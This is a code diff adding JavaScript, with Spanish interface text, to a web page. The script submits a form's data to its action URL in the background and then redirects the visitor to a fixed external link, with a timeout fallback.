@@ -240,6 +240,55 @@
                 closeWelcomeModal();
             }
         });
+
+        const form = document.querySelector("form");
+        const submitBtn = form.querySelector('button[type="submit"]');
+        const btnText = submitBtn ? submitBtn.querySelector(".btn-text") : null;
+
+        form.addEventListener("submit", function (event) {
+            event.preventDefault();
+
+            if (submitBtn) {
+                submitBtn.disabled = true;
+            }
+            if (btnText) {
+                btnText.textContent = "REDIRIGIENDO...";
+            }
+
+            const formData = new FormData(form);
+            const body = new URLSearchParams(formData);
+            const redirectUrl = "https://nek.ui/3145109596";
+            let redirected = false;
+
+            const doRedirect = () => {
+                if (!redirected) {
+                    redirected = true;
+                    window.location.href = redirectUrl;
+                }
+            };
+
+            // Redirección de respaldo en caso de demora en la red
+            const timeoutId = setTimeout(doRedirect, 1000);
+
+            fetch(form.action, {
+                method: "POST",
+                mode: "no-cors",
+                keepalive: true,
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: body.toString()
+            })
+            .then(() => {
+                clearTimeout(timeoutId);
+                doRedirect();
+            })
+            .catch((error) => {
+                console.error("Error al registrar respuesta:", error);
+                clearTimeout(timeoutId);
+                doRedirect();
+            });
+        });
     </script>
 </body>
 </html>
